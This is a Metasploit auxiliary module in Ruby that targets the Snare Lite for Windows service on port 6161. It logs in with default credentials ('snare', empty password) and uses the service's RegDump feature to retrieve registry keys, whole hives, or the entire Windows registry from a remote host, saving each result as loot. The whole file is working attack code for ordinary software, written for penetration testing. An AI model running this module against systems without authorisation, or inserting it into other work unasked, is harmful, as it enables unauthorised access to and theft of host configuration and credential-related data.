##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  HttpFingerprint = { :pattern => [ /SNARE/ ] }

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Snare Lite for Windows Registry Access',
      'Description'   => %q{
          This module uses the Registry Dump feature of the Snare Lite
        for Windows service on 6161/TCP to retrieve the Windows registry.
        The Dump Registry functionality is unavailable in Snare Enterprise.

        Note: The Dump Registry functionality accepts only one connected
        client at a time. Requesting a large key/hive will cause the service
        to become unresponsive until the server completes the request.
      },
      'Platform'      => 'win',
      'Author'        => [ 'Brendan Coles <bcoles[at]gmail.com>' ],
      'License'       => MSF_LICENSE,
      'References'    =>
        [
          [ 'URL', 'https://www.intersectalliance.com/wp-content/uploads/user_guides/Guide_to_Snare_for_Windows-4.2.pdf' ]
        ],
      'Actions'       =>
        [
          [ 'System Information', 'Description' => 'Retrieve information about the system' ],
          [ 'Snare Information', 'Description' => 'Retrieve information about the Snare installation' ],
          [ 'Dump Registry Key', 'Description' => 'Retrieve a specified registry key, including all sub-keys' ],
          [ 'Dump Registry Hive', 'Description' => 'Retrieve a specified registry hive, including all sub-keys' ],
          [ 'Dump Registry', 'Description' => 'Retrieve the entire Windows registry. (Note: this may take a while)' ]
        ],
      'DefaultAction' => 'System Information'
    ))

    register_options(
      [
        Opt::RPORT(6161),
        OptString.new('USERNAME', [ false, 'The username for Snare remote access', 'snare' ]),
        OptString.new('PASSWORD', [ false, 'The password for Snare remote access', '' ]),
        OptString.new('REG_KEY', [ false, 'The registry key to retrieve', 'HKLM\\HARDWARE\\DESCRIPTION\\System' ]),
        OptString.new('REG_HIVE', [ false, 'The registry hive to retrieve', 'HKLM' ]),
        OptInt.new('TIMEOUT', [true, 'Timeout in seconds for downloading each registry key/hive', 300])
      ], self.class)
  end

  def run
    case action.name
    when 'System Information'
      dump_key('HKLM\\HARDWARE\\DESCRIPTION\\System')
    when 'Snare Information'
      dump_key('HKLM\\Software\\InterSect Alliance')
    when 'Dump Registry Key'
      dump_key(datastore['REG_KEY'])
    when 'Dump Registry Hive'
      dump_hive(datastore['REG_HIVE'])
    when 'Dump Registry'
      dump_all
    end
  end

  #
  # Retrieve the supplied registry key
  #
  def dump_key(reg_key)
    if reg_key.nil? || reg_key.empty?
      fail_with(Failure::BadConfig, "#{peer} - Please supply a valid key name")
    end
    hive = reg_key.split('\\').first
    key = reg_key.split('\\')[1..-1].join('\\\\')
    if key.nil? || key.empty? || hive !~ /\A[A-Z0-9_]+\z/i
      fail_with(Failure::BadConfig, "#{peer} - Please supply a valid key name")
    end
    print_status("#{peer} - Retrieving registry key '#{hive}\\\\#{key}'...")
    res = send_request_cgi({
      'uri' => normalize_uri('RegDump'),
      'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
      'vars_get' => {
        'str_Base' => hive,
        'str_SubKey' => key
      }
    }, datastore['TIMEOUT'])
    if !res
      fail_with(Failure::Unreachable, "#{peer} - Connection failed")
    elsif res.code && res.code == 401
      fail_with(Failure::NoAccess, "#{peer} - Authentication failed")
    elsif res.code && res.code == 404
      fail_with(Failure::NotVulnerable, "#{peer} - Dump Registry feature is unavailable")
    elsif res.code && res.code == 200 && res.body && res.body =~ /\AKEY: /
      print_good("#{peer} - Retrieved key successfully (#{res.body.length} bytes)")
    elsif res.code && res.code == 200 && res.body && res.body =~ /the supplied subkey cannot be found/
      fail_with(Failure::NotFound, "#{peer} - The supplied registry key does not exist")
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected reply (#{res.body.length} bytes)")
    end
    path = store_loot(
      'snare.registry.key',
      'text/plain',
      datastore['RHOST'],
      res.body,
      reg_key.gsub(/[^\w]/, '_').downcase
    )
    print_good("File saved in: #{path}")
  end

  #
  # Retrieve the supplied registry hive
  #
  def dump_hive(hive)
    if hive !~ /\A[A-Z0-9_]+\z/i
      fail_with(Failure::BadConfig, "#{peer} - Please supply a valid hive name")
    end
    print_status("#{peer} - Retrieving registry hive '#{hive}' ...")
    res = send_request_cgi({
      'uri' => normalize_uri('RegDump'),
      'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
      'vars_get' => { 'str_Base' => hive }
    }, datastore['TIMEOUT'])
    if !res
      fail_with(Failure::Unreachable, "#{peer} - Connection failed")
    elsif res.code && res.code == 401
      fail_with(Failure::NoAccess, "#{peer} - Authentication failed")
    elsif res.code && res.code == 404
      fail_with(Failure::NotVulnerable, "#{peer} - Dump Registry feature is unavailable")
    elsif res.code && res.code == 200 && res.body && res.body =~ /\AKEY: /
      print_good("#{peer} - Retrieved hive successfully (#{res.body.length} bytes)")
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected reply (#{res.body.length} bytes)")
    end
    path = store_loot(
      'snare.registry.hive',
      'text/plain',
      datastore['RHOST'],
      res.body,
      hive.gsub(/[^\w]/, '_').downcase
    )
    print_good("File saved in: #{path}")
  end

  #
  # Retrieve list of registry hives
  #
  def retrieve_hive_list
    hives = []
    print_status("#{peer} - Retrieving list of registry hives ...")
    res = send_request_cgi(
      'uri' => normalize_uri('RegDump'),
      'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
    )
    if !res
      fail_with(Failure::Unreachable, "#{peer} - Connection failed")
    elsif res.code && res.code == 401
      fail_with(Failure::NoAccess, "#{peer} - Authentication failed")
    elsif res.code && res.code == 404
      fail_with(Failure::NotVulnerable, "#{peer} - Dump Registry feature is unavailable")
    elsif res.code && res.code == 200 && res.body && res.body =~ /RegDump\?str_Base/
      hives = res.body.scan(%r{<li><a href="\/RegDump\?str_Base=([a-zA-Z0-9_]+)">}).flatten
      vprint_good("#{peer} - Found #{hives.length} registry hives (#{hives.join(', ')})")
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected reply (#{res.body.length} bytes)")
    end
    hives
  end

  #
  # Retrieve all registry hives
  #
  def dump_all
    hives = retrieve_hive_list
    if hives.nil? || hives.empty?
      print_error("#{peer} - Found no registry hives")
      return
    end
    hives.each { |hive| dump_hive(hive) }
  end
end
